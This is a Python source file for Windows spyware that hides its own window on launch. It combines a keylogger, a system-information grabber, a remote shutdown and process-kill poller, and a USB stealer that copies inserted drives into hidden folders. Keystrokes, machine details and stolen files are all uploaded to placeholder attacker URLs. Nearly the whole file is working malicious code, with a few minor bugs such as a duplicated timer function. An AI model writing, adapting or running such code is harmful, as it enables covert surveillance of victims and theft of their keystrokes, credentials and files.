
#-------Import this thing and hide the window right away (DO NOT COMMENT THE IMPORTS B/C USB STEALER USES THESE------------------
import win32gui, win32con, win32api
hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide , win32con.SW_HIDE)

#------------------------------------------Import everything else we need(and declare needed vars)-----------------------------------------------------

from pynput.keyboard import Key, Listener
from requests import post, get, codes
import threading
#import time
from datetime import datetime
from subprocess import check_output
from base64 import b64encode, b64decode
import os
from ctypes import *
import errno, shutil
import tempfile
sonurl = "https://yourserver/son.php"
url = "https://yourserver/up.php"
furl = "https://yourserver/upload.php"
dump = ""

#------------------------------------------------------------------------------------------------

#---------------------------------------------------------------------------------General Functions needed---------------------------------------------------------------------------------
def isset(variable):
    return variable in locals() or variable in globals() 
    
def up(type, data):
    global url
    rawuuid = getuuid()
    uuid = b64encode(rawuuid.encode("utf-8"))
    if type == "2":
        data = data.replace("'", "")
        data = b64encode(data.encode("utf-8"))

    r = post(url, data={"1":uuid, type:data})
    if not r.status_code == codes.ok:
        return "err"
        
def getuuid():
    global uuid
    if not isset("uuid"):
        uuid = check_output(["wmic.exe", "csproduct", "get", "uuid"], universal_newlines=True).splitlines()[2]

    return uuid
    
#----------------------------------------------------------------------------- KEYLOGGER-----------------------------------------------------------------------------
def on_press(k):
    global dump
    key = str(k)
    if key == "Key.space":
        key = " "
    if key == "Key.enter":
        key = "<ENTER>"
    if key == "Key.shift":
        key = "<SHIFT>"
    if key == "Key.backspace":
        key = "<BACKSPACE>"
    if key == "Key.ctrl_l":
        key = "<LFT CTRL>"
    if key == "Key.tabkey":
        key = "<TAB>"
    if key == "Key.tab":
        key = "<TAB>"
    if key == "Key.delete":
        key = "<DEL>"
    if key == "Key.right":
        key = "<RIGHT>"
    if key == "Key.left":
        key = "<LEFT>"
    if key == "Key.down":
        key = "<DOWN>"
    if key == "Key.up":
        key = "<UP>"
    if key == "Key.alt_l":
        key = "<ALT LEFT>"
    if key == "Key.f5":
        key = "<F5>"
    if key == "Key.alt_r":
        key = "<ALT RIGHT>"
    dump = dump + key
    

def timer():

    global timert
    global dump
    d = dump
    dump = ""
    if len(d) > 0:
        r = up("2", d)
        if r == "err":
            dump = dump + "RECOVERY: " + d
    timert = threading.Timer(60.0, timer)
    timert.start()    
   
def timer():

    global timert
    global dump
    d = dump
    #dump = ""
    if len(d) > 0:
        r = up("2", d)
        if r == "err":
            dump = dump + "RECOVERY: " + d
    timert = threading.Timer(60.0, timer)
    timert.start()    
    
def start_klog():

    with Listener(on_press=on_press) as listener:
        listener.join() 
    
#----------------------------------------------------------------------------------------------------------------------------------------------------------        


#-----------------------------------------------------------------------------INFO GRABBER-----------------------------------------------------------------------------
def getinfo():

    global pcinfo
    global git
    if isset("pcinfo"):
        r = up("4", pcinfo)
        if r == "err":
            sleep(240)
            git.start
    else:    
        uuid = getuuid()
        ip = get("https://api.ipify.org/").text
        result = "IP: " + ip
        result = result + "\nUUID: " + uuid
        pcinfo = check_output(["systeminfo.exe"], universal_newlines=True)
        result = result + "\nPCINFO: " + pcinfo
        ipconf = check_output(["ipconfig", "/all"], universal_newlines=True)
        result = result + "\nIPCONF: " + ipconf
        cons = check_output(["netstat", "-an"], universal_newlines=True)
        result = result + "\nCONS: " + cons
        oslist = check_output(["wmic", "os", "list", "brief"], universal_newlines=True)
        result = result + "\nOSMANAGER: " + oslist    
        tasklist = check_output(["tasklist"], universal_newlines=True)
        result = result + "\nPS: " + tasklist
        fwstats = check_output(["netsh", "firewall", "show", "all"], universal_newlines=True)
        result = result + "\nFWSTATS: " + fwstats
        startapps = check_output(["wmic", "startup"], universal_newlines=True)
        result = result + "\nSTART: " + startapps
    result = b64encode(result.encode("utf-8"))
    pcinfo = result
    r = up("4", pcinfo)
    if r == "err":
        sleep(240)
        git.start
        
#----------------------------------------------------------------------------------------------------------------------------------------------------------            
        
#-------------------------------------------------------------AUTOSHUTDOWN MANAGER------------------------------------------------------------

def son():

    global sont
    r = get(sonurl)
    if r.text == "1":

        os.system("taskkill /F /T /IM chrome.exe")
    if r.text == "2":
        os.system("taskkill /F /T /IM updater.exe")
        os.system("shutdown -s -t 0")
    sont = threading.Timer(60.0, son)
    sont.start()    

#----------------------------------------------------------------------------------------------------------------------------------------------------------        

#-------------------------------------------------USB STEALER---------------------------------------------------------------------        

def uploadfiles(dir):
    global url
    for subdir, dirs, files in os.walk(dir):
        for file in files:
            ##print os.path.join(subdir, file)
            filepath = subdir + os.sep + file

            #print(filepath)
            
            fin = open(filepath, 'rb')
            file_ = {'uploaded_file': (file, fin)}
            try:
                r = post(url, file_)
                #print(r.text)
            finally:
                fin.close()

def copyfiles(src, dest):
    try:
        shutil.copytree(src, dest)
        return 0
    except OSError as e:
        # If the error was caused because the source wasn't a directory
        if e.errno == errno.ENOTDIR:
            shutil.copy(src, dest)
            return 0
        else:
            ##print('Directory not copied. Error: %s' % e)
            return 1
            
def list_files(startpath):
    rslt = ""
    for root, dirs, files in os.walk(startpath):
        level = root.replace(startpath, '').count(os.sep)
        indent = ' ' * 4 * (level)
        rslt = rslt + "\n" + '{}{}/'.format(indent, os.path.basename(root))
        subindent = ' ' * 4 * (level + 1)
        for f in files:
            rslt = rslt + "\n" + '{}{}'.format(subindent, f)
    return rslt        
            
#
# Device change events (WM_DEVICECHANGE wParam)
#
DBT_DEVICEARRIVAL = 0x8000
DBT_DEVICEQUERYREMOVE = 0x8001
DBT_DEVICEQUERYREMOVEFAILED = 0x8002
DBT_DEVICEMOVEPENDING = 0x8003
DBT_DEVICEREMOVECOMPLETE = 0x8004
DBT_DEVICETYPESSPECIFIC = 0x8005
DBT_CONFIGCHANGED = 0x0018
#
# type of device in DEV_BROADCAST_HDR
#
DBT_DEVTYP_OEM = 0x00000000
DBT_DEVTYP_DEVNODE = 0x00000001
DBT_DEVTYP_VOLUME = 0x00000002
DBT_DEVTYPE_PORT = 0x00000003
DBT_DEVTYPE_NET = 0x00000004

#
# media types in DBT_DEVTYP_VOLUME
#
DBTF_MEDIA = 0x0001
DBTF_NET = 0x0002

WORD = c_ushort
DWORD = c_ulong

class DEV_BROADCAST_HDR (Structure):
  _fields_ = [
    ("dbch_size", DWORD),
    ("dbch_devicetype", DWORD),
    ("dbch_reserved", DWORD)
  ]

class DEV_BROADCAST_VOLUME (Structure):
  _fields_ = [
    ("dbcv_size", DWORD),
    ("dbcv_devicetype", DWORD),
    ("dbcv_reserved", DWORD),
    ("dbcv_unitmask", DWORD),
    ("dbcv_flags", WORD)
  ]

def drive_from_mask (mask):
  n_drive = 0
  while 1:
    if (mask & (2 ** n_drive)): return n_drive
    else: n_drive += 1

class Notification:

  def __init__(self):
    message_map = {
      win32con.WM_DEVICECHANGE : self.onDeviceChange
    }

    wc = win32gui.WNDCLASS ()
    hinst = wc.hInstance = win32api.GetModuleHandle (None)
    wc.lpszClassName = "DeviceChangeDemo"
    wc.style = win32con.CS_VREDRAW | win32con.CS_HREDRAW;
    wc.hCursor = win32gui.LoadCursor (0, win32con.IDC_ARROW)
    wc.hbrBackground = win32con.COLOR_WINDOW
    wc.lpfnWndProc = message_map
    classAtom = win32gui.RegisterClass (wc)
    style = win32con.WS_OVERLAPPED | win32con.WS_SYSMENU
    self.hwnd = win32gui.CreateWindow (
      classAtom,
      "Device Change Demo",
      style,
      0, 0,
      win32con.CW_USEDEFAULT, win32con.CW_USEDEFAULT,
      0, 0,
      hinst, None
    )

  def onDeviceChange (self, hwnd, msg, wparam, lparam):
    #
    # WM_DEVICECHANGE:
    #  wParam - type of change: arrival, removal etc.
    #  lParam - what's changed?
    #    if it's a volume then...
    #  lParam - what's changed more exactly
    #
    dev_broadcast_hdr_var = DEV_BROADCAST_HDR.from_address (lparam)

    if wparam == DBT_DEVICEARRIVAL:

      if dev_broadcast_hdr_var.dbch_devicetype == DBT_DEVTYP_VOLUME:

        dev_broadcast_volume = DEV_BROADCAST_VOLUME.from_address (lparam)

        drive_letter = drive_from_mask (dev_broadcast_volume.dbcv_unitmask)
        #print("New USB, Letter:", chr (ord ("A") + drive_letter))
        fldr =  chr (ord ("A") + drive_letter) + ":\\"
        date = datetime.now().strftime("%d%m%Y%H%M%S")
        tempfldr = "d:\\.Microsoft\\" +  date + "\\" 
        
        
        
 
        if copyfiles(fldr, tempfldr) == 1:
            tempfldr = tempfile.mkdtemp() + "\\"
            #print("New Temp Folder:", tempfldr)
            shutil.rmtree(tempfldr)
            copyfiles(fldr, tempfldr)
        else:
            windll.kernel32.SetFileAttributesW(tempfldr + "\\..", 0x02)
            
        #print("Temp Folder:", tempfldr)
        windll.kernel32.SetFileAttributesW(tempfldr, 0x02)
        data = tempfldr + "\n" + list_files(fldr)
        #print(b64encode(data.encode("utf-8")))
        up("5", b64encode(data.encode("utf-8")))
        uploadfiles(tempfldr)
        
    return 1
    
def usbstealer():
    w = Notification ()
    win32gui.PumpMessages ()
    

            
    
#----------------------------------------------------------------------------------------------------------------------------------------------------------        

    
def main():
    global git #Aka GetInfoThread
    git = threading.Thread(target=getinfo)
    git.start()
    
    global klt #Aka KeyLoggerThread(Yes, I'm that good at naming things)
    klt = threading.Thread(target=start_klog)
    klt.start()
    
    global timert #I think you got this one :P
    timert = threading.Thread(target=timer)
    timert.start()
    
    global sont
    sont = threading.Thread(target=son)
    sont.start()
    
    global usbstealert
    usbstealert = threading.Thread(target=usbstealer)
    usbstealert.start()


main()